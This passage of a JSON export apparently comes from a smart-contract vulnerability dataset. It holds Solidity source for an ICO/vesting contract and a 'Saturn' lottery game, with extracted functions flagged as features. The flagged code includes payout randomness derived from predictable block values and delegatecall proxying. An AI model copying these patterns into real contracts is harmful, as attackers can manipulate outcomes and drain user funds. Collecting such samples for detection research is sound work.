_rewards) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function buy() public payable {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function allowTransfer(address _owner) public view returns (bool _success, bool _allow) {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0x40)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0x40)\n }\n }\n }\n function calculateReward(uint256 _input) public view returns (bool _success, uint256 _reward) {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0x40)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0x40)\n }\n }\n }\n function calcVesting(address _owner) public view returns(bool _success, uint256 _reward) {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0x40)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0x40)\n }\n }\n }\n event Brought(address _owner, address _beneficiary, uint256 _input, uint256 _output);\n event VestingDefined(address _beneficiary, uint256 _amount, uint256 _startBlock, uint256 _endBlock);\n event VestingClaimed(address _beneficiary, uint256 _amount);\n}\ncontract IcoLib is Ico {\n constructor(address _owner, address _tokenAddress, address _offchainUploaderAddress, address _setKYCAddress, address _setRateAddress)\n Ico(_owner, 0x00, _tokenAddress, _offchainUploaderAddress, _setKYCAddress, _setRateAddress) public {}\n function setVesting(address _beneficiary, uint256 _amount, uint256 _startBlock, uint256 _endBlock) external forOwner {\n require( _beneficiary != 0x00 );\n thisBalance = thisBalance.add( vesting[_beneficiary].amount.sub(vesting[_beneficiary].claimedAmount) );\n if ( _amount == 0 ) {\n delete vesting[_beneficiary];\n emit VestingDefined(_beneficiary, 0, 0, 0);\n } else {\n require( _endBlock > _startBlock );\n vesting[_beneficiary] = vesting_s(\n _amount,\n _startBlock,\n _endBlock,\n 0\n );\n thisBalance = thisBalance.sub( _amount );\n emit VestingDefined(_beneficiary, _amount, _startBlock, _endBlock);\n }\n }\n function claimVesting() external {\n uint256 _reward;\n bool _subResult;\n ( _subResult, _reward ) = calcVesting(msg.sender);\n require( _subResult && _reward > 0 );\n vesting[msg.sender].claimedAmount = vesting[msg.sender].claimedAmount.add(_reward);\n require( token.transfer(msg.sender, _reward) );\n }\n function setKYC(address[] _on, address[] _off) external {\n uint256 i;\n require( msg.sender == setKYCAddress );\n for ( i=0 ; i<_on.length ; i++ ) {\n KYC[_on[i]] = true;\n }\n for ( i=0 ; i<_off.length ; i++ ) {\n delete KYC[_off[i]];\n }\n }\n function setTransferRight(address[] _allow, address[] _disallow) external forOwner {\n uint256 i;\n for ( i=0 ; i<_allow.length ; i++ ) {\n transferRight[_allow[i]] = true;\n }\n for ( i=0 ; i<_disallow.length ; i++ ) {\n delete transferRight[_disallow[i]];\n }\n }\n function setCurrentRate(uint256 _currentRate) external {\n require( msg.sender == setRateAddress );\n require( _currentRate >= currentRateM );\n currentRate = _currentRate;\n }\n function setCurrentPhase(phaseType _phase) external forOwner {\n currentPhase = _phase;\n }\n function offchainUpload(address[] _beneficiaries, uint256[] _rewards) external {\n uint256 i;\n uint256 _totalReward;\n require( msg.sender == offchainUploaderAddress );\n require( currentPhase != phaseType.pause && currentPhase != phaseType.finish );\n require( _beneficiaries.length == _rewards.length );\n for ( i=0 ; i<_rewards.length ; i++ ) {\n _totalReward = _totalReward.add(_rewards[i]);\n emit Brought(msg.sender, _beneficiaries[i], 0, _rewards[i]);\n }\n thisBalance = thisBalance.sub(_totalReward);\n if ( currentPhase == phaseType.privateSale1 ) {\n privateSale1Hardcap = privateSale1Hardcap.sub(_totalReward);\n } else if ( currentPhase == phaseType.privateSale2 ) {\n privateSale2Hardcap = privateSale2Hardcap.sub(_totalReward);\n }\n token.bulkTransfer(_beneficiaries, _rewards);\n }\n function buy() public payable {\n uint256 _reward;\n bool _subResult;\n require( currentPhase == phaseType.privateSale2 ||\n currentPhase == phaseType.sales1 ||\n currentPhase == phaseType.sales2 ||\n currentPhase == phaseType.sales3 ||\n currentPhase == phaseType.sales4 ||\n currentPhase == phaseType.preFinish\n );\n require( KYC[msg.sender] );\n ( _subResult, _reward ) = calculateReward(msg.value);\n require( _reward > 0 && _subResult );\n thisBalance = thisBalance.sub(_reward);\n require( owner.send(msg.value) );\n if ( currentPhase == phaseType.privateSale1 ) {\n privateSale1Hardcap = privateSale1Hardcap.sub(_reward);\n } else if ( currentPhase == phaseType.privateSale2 ) {\n privateSale2Hardcap = privateSale2Hardcap.sub(_reward);\n }\n require( token.transfer(msg.sender, _reward) );\n emit Brought(msg.sender, msg.sender, msg.value, _reward);\n }\n function allowTransfer(address _owner) public view returns (bool _success, bool _allow) {\n return ( true, _owner == address(this) || transferRight[_owner] || currentPhase == phaseType.preFinish || currentPhase == phaseType.finish );\n }\n function calculateReward(uint256 _input) public view returns (bool _success, uint256 _reward) {\n uint256 _amount;\n _success = true;\n if ( currentRate == 0 || _input == 0 ) {\n return;\n }\n _amount = _input.mul(1e8).mul(100).mul(currentRate).div(1e18).div(currentRateM);\n if ( _amount == 0 ) {\n return;\n }\n if ( currentPhase == phaseType.privateSale1 ) {\n if ( _amount >= 25e13 ) {\n _reward = _amount.mul(142).div(100);\n } else if ( _amount >= 10e13 ) {\n _reward = _amount.mul(137).div(100);\n } else if ( _amount >= 2e13 ) {\n _reward = _amount.mul(133).div(100);\n }\n if ( _reward > 0 && privateSale1Hardcap < _reward ) {\n _reward = 0;\n }\n } else if ( currentPhase == phaseType.privateSale2 ) {\n if ( _amount >= 125e13 ) {\n _reward = _amount.mul(129).div(100);\n } else if ( _amount >= 100e13 ) {\n _reward = _amount.mul(124).div(100);\n } else if ( _amount >= 10e13 ) {\n _reward = _amount.mul(121).div(100);\n }\n if ( _reward > 0 && privateSale2Hardcap < _reward ) {\n _reward = 0;\n }\n } else if ( currentPhase == phaseType.sales1 ) {\n if ( _amount >= 1e13 ) {\n _reward = _amount.mul(117).div(100);\n }\n } else if ( currentPhase == phaseType.sales2 ) {\n if ( _amount >= 1e13 ) {\n _reward = _amount.mul(112).div(100);\n }\n } else if ( currentPhase == phaseType.sales3 ) {\n if ( _amount >= 1e13 ) {\n _reward = _amount.mul(109).div(100);\n }\n } else if ( currentPhase == phaseType.sales4 ) {\n if ( _amount >= 1e13 ) {\n _reward = _amount.mul(102).div(100);\n }\n } else if ( currentPhase == phaseType.preFinish ) {\n _reward = _amount;\n }\n if ( thisBalance < _reward ) {\n _reward = 0;\n }\n }\n function calcVesting(address _owner) public view returns(bool _success, uint256 _reward) {\n vesting_s memory _vesting = vesting[_owner];\n if ( _vesting.amount == 0 || block.number < _vesting.startBlock ) {\n return ( true, 0 );\n }\n _reward = _vesting.amount.mul( block.number.sub(_vesting.startBlock) ).div( _vesting.endBlock.sub(_vesting.startBlock) );\n if ( _reward > _vesting.amount ) {\n _reward = _vesting.amount;\n }\n if ( _reward <= _vesting.claimedAmount ) {\n return ( true, 0 );\n }\n return ( true, _reward.sub(_vesting.claimedAmount) );\n }\n}",
  "extract_feature": [
    "function calcVesting(address _owner) public view returns(bool _success, uint256 _reward) {\nvesting_s memory _vesting = vesting[_owner];\nif ( _vesting.amount == 0 || block.number < _vesting.startBlock ) {\nreturn ( true, 0 );\n}\n_reward = _vesting.amount.mul( block.number.sub(_vesting.startBlock) ).div( _vesting.endBlock.sub(_vesting.startBlock) );\nif ( _reward > _vesting.amount ) {\n_reward = _vesting.amount;\n}\nif ( _reward <= _vesting.claimedAmount ) {\nreturn ( true, 0 );\n}\nreturn ( true, _reward.sub(_vesting.claimedAmount) );\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b87"
  },
  "filename": "399.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n function sqrt(uint256 x) internal pure returns (uint256 y) {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y) {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Saturn is Ownable {\n using SafeMath for uint256;\n struct Player {\n uint256 pid;\n uint256 ethTotal;\n uint256 ethBalance;\n uint256 ethWithdraw;\n uint256 ethShareWithdraw;\n uint256 tokenBalance;\n uint256 tokenDay;\n uint256 tokenDayBalance;\n }\n struct LuckyRecord {\n address player;\n uint256 amount;\n uint64 txId;\n uint64 time;\n uint64 level;\n }\n struct LuckyPending {\n address player;\n uint256 amount;\n uint64 txId;\n uint64 block;\n uint64 level;\n }\n struct InternalBuyEvent {\n uint256 flag1;\n }\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Buy(\n address indexed _token, address indexed _player, uint256 _amount, uint256 _total,\n uint256 _totalSupply, uint256 _totalPot, uint256 _sharePot, uint256 _finalPot, uint256 _luckyPot,\n uint256 _price, uint256 _flag1\n );\n event Withdraw(address indexed _token, address indexed _player, uint256 _amount);\n event Win(address indexed _token, address indexed _winner, uint256 _winAmount);\n string constant public name = \"Saturn\";\n string constant public symbol = \"SAT\";\n uint8 constant public decimals = 18;\n uint256 constant private FEE_REGISTER_ACCOUNT = 10 finney;\n uint256 constant private BUY_AMOUNT_MIN = 1000000000;\n uint256 constant private BUY_AMOUNT_MAX = 100000000000000000000000;\n uint256 constant private TIME_DURATION_INCREASE = 30 seconds;\n uint256 constant private TIME_DURATION_MAX = 24 hours;\n uint256 constant private ONE_TOKEN = 1000000000000000000;\n mapping(address => Player) public playerOf;\n mapping(uint256 => address) public playerIdOf;\n uint256 public playerCount;\n uint256 public totalSupply;\n uint256 public totalPot;\n uint256 public sharePot;\n uint256 public finalPot;\n uint256 public luckyPot;\n uint64 public txCount;\n uint256 public finishTime;\n uint256 public startTime;\n address public lastPlayer;\n address public winner;\n uint256 public winAmount;\n uint256 public price;\n address[3] public dealers;\n uint256 public dealerDay;\n LuckyPending[] public luckyPendings;\n uint256 public luckyPendingIndex;\n LuckyRecord[] public luckyRecords;\n address public feeOwner;\n uint256 public feeAmount;\n uint64[16] public feePrices = [uint64(88000000000000),140664279921934,224845905067685,359406674201608,574496375292119,918308169866219,1467876789325690,2346338995279770,3750523695724810,5995053579423660,9582839714125510,15317764181758900,24484798507285300,39137915352965200,62560303190573500,99999999999999100];\n uint8[16] public feePercents = [uint8(150),140,130,120,110,100,90,80,70,60,50,40,30,20,10,0];\n uint256 public feeIndex;\n constructor(uint256 _startTime, address _feeOwner) public {\n require(_startTime >= now && _feeOwner != address(0));\n startTime = _startTime;\n finishTime = _startTime + TIME_DURATION_MAX;\n totalSupply = 0;\n price = 88000000000000;\n feeOwner = _feeOwner;\n owner = msg.sender;\n }\n modifier isActivated() {\n require(now >= startTime);\n _;\n }\n modifier isAccount() {\n address _address = msg.sender;\n uint256 _codeLength;\n assembly {_codeLength := extcodesize(_address)}\n require(_codeLength == 0 && tx.origin == msg.sender);\n _;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return playerOf[_owner].tokenBalance;\n }\n function getLuckyPendingSize() public view returns (uint256) {\n return luckyPendings.length;\n }\n function getLuckyRecordSize() public view returns (uint256) {\n return luckyRecords.length;\n }\n function getGameInfo() public view returns (\n uint256 _balance, uint256 _totalPot, uint256 _sharePot, uint256 _finalPot, uint256 _luckyPot, uint256 _rewardPot, uint256 _price,\n uint256 _totalSupply, uint256 _now, uint256 _timeLeft, address _winner, uint256 _winAmount, uint8 _feePercent\n ) {\n _balance = address(this).balance;\n _totalPot = totalPot;\n _sharePot = sharePot;\n _finalPot = finalPot;\n _luckyPot = luckyPot;\n _rewardPot = _sharePot;\n uint256 _withdraw = _sharePot.add(_finalPot).add(_luckyPot);\n if (_totalPot > _withdraw) {\n _rewardPot = _rewardPot.add(_totalPot.sub(_withdraw));\n }\n _price = price;\n _totalSupply = totalSupply;\n _now = now;\n _feePercent = feeIndex >= feePercents.length ? 0 : feePercents[feeIndex];\n if (now < finishTime) {\n _timeLeft = finishTime - now;\n } else {\n _timeLeft = 0;\n _winner = winner != address(0) ? winner : lastPlayer;\n _winAmount = winner != address(0) ? winAmount : finalPot;\n }\n }\n function getPlayerInfo(address _playerAddress) public view returns (\n uint256 _pid, uint256 _ethTotal, uint256 _ethBalance, uint256 _ethWithdraw,\n uint256 _tokenBalance, uint256 _tokenDayBalance\n ) {\n Player storage _player = playerOf[_playerAddress];\n if (_player.pid > 0) {\n _pid = _player.pid;\n _ethTotal = _player.ethTotal;\n uint256 _sharePot = _player.tokenBalance.mul(sharePot).div(totalSupply);\n _ethBalance = _player.ethBalance;\n if (_sharePot > _player.ethShareWithdraw) {\n _ethBalance = _ethBalance.add(_sharePot.sub(_player.ethShareWithdraw));\n }\n _ethWithdraw = _player.ethWithdraw;\n _tokenBalance = _player.tokenBalance;\n uint256 _day = (now / 86400) * 86400;\n if (_player.tokenDay == _day) {\n _tokenDayBalance = _player.tokenDayBalance;\n }\n }\n }\n function getDealerAndLuckyInfo(uint256 _luckyOffset) public view returns (\n address[3] _dealerPlayers, uint256[3] _dealerDayTokens, uint256[3] _dealerTotalTokens,\n address[5] _luckyPlayers, uint256[5] _luckyAmounts, uint256[5] _luckyLevels, uint256[5] _luckyTimes\n ) {\n uint256 _day = (now / 86400) * 86400;\n if (dealerDay == _day) {\n for (uint256 _i = 0; _i < 3; ++_i) {\n if (dealers[_i] != address(0)) {\n Player storage _player = playerOf[dealers[_i]];\n _dealerPlayers[_i] = dealers[_i];\n _dealerDayTokens[_i] = _player.tokenDayBalance;\n _dealerTotalTokens[_i] = _player.tokenBalance;\n }\n }\n }\n uint256 _size = _luckyOffset >= luckyRecords.length ? 0 : luckyRecords.length - _luckyOffset;\n if (_luckyPlayers.length < _size) {\n _size = _luckyPlayers.length;\n }\n for (_i = 0; _i < _size; ++_i) {\n LuckyRecord memory _record = luckyRecords[luckyRecords.length - _luckyOffset - 1 - _i];\n _luckyPlayers[_i] = _record.player;\n _luckyAmounts[_i] = _record.amount;\n _luckyLevels[_i] = _record.level;\n _luckyTimes[_i] = _record.time;\n }\n }\n function transfer(address _to, uint256 _value) isActivated isAccount public returns (bool) {\n require(_to == address(this));\n Player storage _player = playerOf[msg.sender];\n require(_player.pid > 0);\n if (now >= finishTime) {\n if (winner == address(0)) {\n endGame();\n }\n _value = 80000000000000000;\n } else {\n require(_value == 80000000000000000 || _value == 10000000000000000);\n }\n uint256 _sharePot = _player.tokenBalance.mul(sharePot).div(totalSupply);\n uint256 _eth = 0;\n if (_sharePot > _player.ethShareWithdraw) {\n _eth = _sharePot.sub(_player.ethShareWithdraw);\n _player.ethShareWithdraw = _sharePot;\n }\n _eth = _eth.add(_player.ethBalance);\n _player.ethBalance = 0;\n _player.ethWithdraw = _player.ethWithdraw.add(_eth);\n if (_value == 80000000000000000) {\n uint256 _fee = _eth.mul(feeIndex >= feePercents.length ? 0 : feePercents[feeIndex]).div(1000);\n if (_fee > 0) {\n feeAmount = feeAmount.add(_fee);\n _eth = _eth.sub(_fee);\n }\n sendFeeIfAvailable();\n msg.sender.transfer(_eth);\n emit Withdraw(_to, msg.sender, _eth);\n emit Transfer(msg.sender, _to, 0);\n } else {\n InternalBuyEvent memory _buyEvent = InternalBuyEvent({\n flag1: 0\n });\n buy(_player, _buyEvent, _eth);\n }\n return true;\n }\n function() isActivated isAccount payable public {\n uint256 _eth = msg.value;\n require(now < finishTime);\n InternalBuyEvent memory _buyEvent = InternalBuyEvent({\n flag1: 0\n });\n Player storage _player = playerOf[msg.sender];\n if (_player.pid == 0) {\n require(_eth >= FEE_REGISTER_ACCOUNT);\n uint256 _fee = FEE_REGISTER_ACCOUNT.sub(BUY_AMOUNT_MIN);\n _eth = _eth.sub(_fee);\n feeAmount = feeAmount.add(_fee);\n playerCount = playerCount.add(1);\n Player memory _p = Player({\n pid: playerCount,\n ethTotal: 0,\n ethBalance: 0,\n ethWithdraw: 0,\n ethShareWithdraw: 0,\n tokenBalance: 0,\n tokenDay: 0,\n tokenDayBalance: 0\n });\n playerOf[msg.sender] = _p;\n playerIdOf[_p.pid] = msg.sender;\n _player = playerOf[msg.sender];\n _buyEvent.flag1 += 1;\n }\n buy(_player, _buyEvent, _eth);\n }\n function buy(Player storage _player, InternalBuyEvent memory _buyEvent, uint256 _amount) private {\n require(now < finishTime && _amount >= BUY_AMOUNT_MIN && _amount <= BUY_AMOUNT_MAX);\n uint256 _day = (now / 86400) * 86400;\n uint256 _backEth = 0;\n uint256 _eth = _amount;\n if (totalPot < 200000000000000000000) {\n if (_eth >= 5000000000000000000) {\n _backEth = _eth.sub(5000000000000000000);\n _eth = 5000000000000000000;\n }\n }\n txCount = txCount + 1;\n _buyEvent.flag1 += txCount * 10;\n _player.ethTotal = _player.ethTotal.add(_eth);\n totalPot = totalPot.add(_eth);\n uint256 _newTotalSupply = calculateTotalSupply(totalPot);\n uint256 _tokenAmount = _newTotalSupply.sub(totalSupply);\n _player.tokenBalance = _player.tokenBalance.add(_tokenAmount);\n if (_player.tokenDay == _day) {\n _player.tokenDayBalance = _player.tokenDayBalance.add(_tokenAmount);\n } else {\n _player.tokenDay = _day;\n _player.tokenDayBalance = _tokenAmount;\n }\n updatePrice(_newTotalSupply);\n handlePot(_day, _eth, _newTotalSupply, _tokenAmount, _player, _buyEvent);\n if (_backEth > 0) {\n _player.ethBalance = _player.ethBalance.add(_backEth);\n }\n sendFeeIfAvailable();\n emitEndTxEvents(_eth, _tokenAmount, _buyEvent);\n }\n function handlePot(uint256 _day, uint256 _eth, uint256 _newTotalSupply, uint256 _tokenAmount, Player storage _player, InternalBuyEvent memory _buyEvent) private {\n uint256 _sharePotDelta = _eth.div(2);\n uint256 _finalPotDelta = _eth.div(5);\n uint256 _luckyPotDelta = _eth.mul(255).div(1000);\n uint256 _dealerPotDelta = _eth.sub(_sharePotDelta).sub(_finalPotDelta).sub(_luckyPotDelta);\n sharePot = sharePot.add(_sharePotDelta);\n finalPot = finalPot.add(_finalPotDelta);\n luckyPot = luckyPot.add(_luckyPotDelta);\n totalSupply = _newTotalSupply;\n handleDealerPot(_day, _dealerPotDelta, _player, _buyEvent);\n handleLuckyPot(_eth, _player);\n if (_tokenAmount >= ONE_TOKEN) {\n updateFinishTime(_tokenAmount);\n lastPlayer = msg.sender;\n }\n _buyEvent.flag1 += finishTime * 1000000000000000000000;\n }\n function handleLuckyPot(uint256 _eth, Player storage _player) private {\n uint256 _seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n (block.number)\n )));\n _seed = _seed - ((_seed / 1000) * 1000);\n uint64 _level = 0;\n if (_seed < 227) {\n _level = 1;\n } else if (_seed < 422) {\n _level = 2;\n } else if (_seed < 519) {\n _level = 3;\n } else if (_seed < 600) {\n _level = 4;\n } else if (_seed < 700) {\n _level = 5;\n } else {\n _level = 6;\n }\n if (_level >= 5) {\n handleLuckyReward(txCount, _level, _eth, _player);\n } else {\n LuckyPending memory _pending = LuckyPending({\n player: msg.sender,\n amount: _eth,\n txId: txCount,\n block: uint64(block.number + 1),\n level: _level\n });\n luckyPendings.push(_pending);\n }\n handleLuckyPending(_level >= 5 ? 0 : 1);\n }\n function handleLuckyPending(uint256 _pendingSkipSize) private {\n if (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\n LuckyPending storage _pending = luckyPendings[luckyPendingIndex];\n if (_pending.block <= block.number) {\n uint256 _seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp).add\n (block.difficulty).add\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n (block.gaslimit).add\n (block.number)\n )));\n _seed = _seed - ((_seed / 1000) * 1000);\n handleLucyPendingForOne(_pending, _seed);\n if (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\n _pending = luckyPendings[luckyPendingIndex];\n if (_pending.block <= block.number) {\n handleLucyPendingForOne(_pending, _seed);\n }\n }\n }\n }\n }\n function handleLucyPendingForOne(LuckyPending storage _pending, uint256 _seed) private {\n luckyPendingIndex = luckyPendingIndex.add(1);\n bool _reward = false;\n if (_pending.level == 4) {\n _reward = _seed < 617;\n } else if (_pending.level == 3) {\n _reward = _seed < 309;\n } else if (_pending.level == 2) {\n _reward = _seed < 102;\n } else if (_pending.level == 1) {\n _reward = _seed < 44;\n }\n if (_reward) {\n handleLuckyReward(_pending.txId, _pending.level, _pending.amount, playerOf[_pending.player]);\n }\n }\n function handleLuckyReward(uint64 _txId, uint64 _level, uint256 _eth, Player storage _player) private {\n uint256 _amount;\n if (_level == 1) {\n _amount = _eth.mul(7);\n } else if (_level == 2) {\n _amount = _eth.mul(3);\n } else if (_level == 3) {\n _amount = _eth;\n } else if (_level == 4) {\n _amount = _eth.div(2);\n } else if (_level == 5) {\n _amount = _eth.div(5);\n } else if (_level == 6) {\n _amount = _eth.div(10);\n }\n uint256 _maxPot = luckyPot.div(2);\n if (_amount > _maxPot) {\n _amount = _maxPot;\n }\n luckyPot = luckyPot.sub(_amount);\n _player.ethBalance = _player.ethBalance.add(_amount);\n LuckyRecord memory _record = LuckyRecord({\n player: msg.sender,\n amount: _amount,\n txId: _txId,\n level: _level,\n time: uint64(now)\n });\n luckyRecords.push(_record);\n }\n function handleDealerPot(uint256 _day, uint256 _dealerPotDelta, Player storage _player, InternalBuyEvent memory _buyEvent) private {\n uint256 _potUnit = _dealerPotDelta.div(dealers.length);\n if (dealerDay != _day || dealers[0] == address(0)) {\n dealerDay = _day;\n dealers[0] = msg.sender;\n dealers[1] = address(0);\n dealers[2] = address(0);\n _player.ethBalance = _player.ethBalance.add(_potUnit);\n feeAmount = feeAmount.add(_dealerPotDelta.sub(_potUnit));\n _buyEvent.flag1 += _player.pid * 100000000000000000000000000000000;\n return;\n }\n for (uint256 _i = 0; _i < dealers.length; ++_i) {\n if (dealers[_i] == address(0)) {\n dealers[_i] = msg.sender;\n break;\n }\n if (dealers[_i] == msg.sender) {\n break;\n }\n Player storage _dealer = playerOf[dealers[_i]];\n if (_dealer.tokenDayBalance < _player.tokenDayBalance) {\n for (uint256 _j = dealers.length - 1; _j > _i; --_j) {\n if (dealers[_j - 1] != msg.sender) {\n dealers[_j] = dealers[_j - 1];\n }\n }\n dealers[_i] = msg.sender;\n break;\n }\n }\n uint256 _fee = _dealerPotDelta;\n for (_i = 0; _i < dealers.length; ++_i) {\n if (dealers[_i] == address(0)) {\n break;\n }\n _dealer = playerOf[dealers[_i]];\n _dealer.ethBalance = _dealer.ethBalance.add(_potUnit);\n _fee = _fee.sub(_potUnit);\n _buyEvent.flag1 += _dealer.pid *\n (_i == 0 ? 100000000000000000000000000000000 :\n (_i == 1 ? 100000000000000000000000000000000000000000000000 :\n (_i == 2 ? 100000000000000000000000000000000000000000000000000000000000000 : 0)));\n }\n if (_fee > 0) {\n feeAmount = feeAmount.add(_fee);\n }\n }\n function emitEndTxEvents(uint256 _eth, uint256 _tokenAmount, InternalBuyEvent memory _buyEvent) private {\n emit Transfer(address(this), msg.sender, _tokenAmount);\n emit Buy(\n address(this), msg.sender, _eth, _tokenAmount,\n totalSupply, totalPot, sharePot, finalPot, luckyPot,\n price, _buyEvent.flag1\n );\n }\n function endGame() private {\n if (luckyPot > 0) {\n feeAmount = feeAmount.add(luckyPot);\n luckyPot = 0;\n }\n if (winner == address(0) && lastPlayer != address(0)) {\n winner = lastPlayer;\n lastPlayer = address(0);\n winAmount = finalPot;\n finalPot = 0;\n Player storage _player = playerOf[winner];\n _player.ethBalance = _player.ethBalance.add(winAmount);\n emit Win(address(this), winner, winAmount);\n }\n }\n function updateFinishTime(uint256 _tokenAmount) private {\n uint256 _timeDelta = _tokenAmount.div(ONE_TOKEN).mul(TIME_DURATION_INCREASE);\n uint256 _finishTime = finishTime.add(_timeDelta);\n uint256 _maxTime = now.add(TIME_DURATION_MAX);\n finishTime = _finishTime <= _maxTime ? _finishTime : _maxTime;\n }\n function updatePrice(uint256 _newTotalSupply) private {\n price = _newTotalSupply.mul(2).div(10000000000).add(88000000000000);\n uint256 _idx = feeIndex + 1;\n while (_idx < feePrices.length && price >= feePrices[_idx]) {\n feeIndex = _idx;\n ++_idx;\n }\n }\n function calculateTotalSupply(uint256 _newTotalPot) private pure returns(uint256) {\n return _newTotalPot.mul(10000000000000000000000000000)\n .add(193600000000000000000000000000000000000000000000)\n .sqrt()\n .sub(440000000000000000000000);\n }\n function sendFeeIfAvailable() private {\n if (feeAmount > 1000000000000000000) {\n feeOwner.transfer(feeAmount);\n feeAmount = 0;\n }\n }\n function changeFeeOwner(address _feeOwner) onlyOwner public {\n require(_feeOwner != feeOwner && _feeOwner != address(0));\n feeOwner = _feeOwner;\n }\n function withdrawFee(uint256 _amount) onlyOwner public {\n require(now >= finishTime.add(30 days));\n if (winner == address(0)) {\n endGame();\n }\n feeAmount = feeAmount > _amount ? feeAmount.sub(_amount) : 0;\n feeOwner.transfer(_amount);\n }\n}",
  "extract_feature": [
    "function handleLuckyPot(uint256 _eth, Player storage _player) private {\nuint256 _seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\n_seed = _seed - ((_seed / 1000) * 1000);\nuint64 _level = 0;\nif (_seed < 227) {\n_level = 1;\n} else if (_seed < 422) {\n_level = 2;\n} else if (_seed < 519) {\n_level = 3;\n} else if (_seed < 600) {\n_level = 4;\n} else if (_seed < 700) {\n_level = 5;\n} else {\n_level = 6;\n}\nif (_level >= 5) {\nhandleLuckyReward(txCount, _level, _eth, _player);\n} else {\nLuckyPending memory _pending = LuckyPending({\nplayer: msg.sender,\namount: _eth,\ntxId: txCount,\nblock: uint64(block.number + 1),\nlevel: _level\n});\nluckyPendings.push(_pending);\n}\nhandleLuckyPending(_level >= 5 ? 0 : 1);\n}",
    "function handleLuckyPending(uint256 _pendingSkipSize) private {\nif (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\nLuckyPending storage _pending = luckyPendings[luckyPendingIndex];\nif (_pending.block <= block.number) {\nuint256 _seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n(block.number)\n)));\n_seed = _seed - ((_seed / 1000) * 1000);\nhandleLucyPendingForOne(_pending, _seed);\nif (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {\n_pending = luckyPendings[luckyPendingIndex];\nif (_pending.block <= block.number) {\nhandleLucyPendingForOne(_pending, _seed);\n}\n}\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b88"
  },
  "filename": "413.sol",
  "content": "pragma solidity ^0.4.10;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI 